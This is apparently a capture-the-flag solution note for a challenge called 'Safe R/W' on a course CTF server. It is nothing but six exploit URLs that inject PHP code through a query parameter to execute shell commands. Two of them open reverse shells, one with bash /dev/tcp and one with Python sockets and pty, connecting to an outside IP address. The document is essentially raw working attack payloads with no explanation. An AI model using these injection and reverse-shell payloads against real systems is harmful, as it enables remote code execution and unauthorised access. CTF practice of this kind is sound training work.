# Safe R/W

1. https://edu-ctf.csie.org:10155/?f=data:,&i=data:,/meow&c=<?php system('ls')?>
2. https://edu-ctf.csie.org:10155/?f=data:,&i=data:,/meow&c=<?php echo `ls`?>
3. https://edu-ctf.csie.org:10155/?f=data:,&i=data:,/meow&c=<?php `$_GET['x']`?>
4. https://edu-ctf.csie.org:10155/?f=data:,&i=data:,/meow&c=<?php `$_GET["xx"]`?>&xx=ls&src=1 
5. https://edu-ctf.csie.org:10155/?f=data:,&i=data:,/meow&c=<?php `$_GET[x]`?>&x=bash -i >& /dev/tcp/140.113.68.171/1234 0>&1&src=1
6. https://edu-ctf.csie.org:10155/?f=data:,&i=data:,/meow&c=<?php `$_GET[x]`?>&x=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("140.113.68.171",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
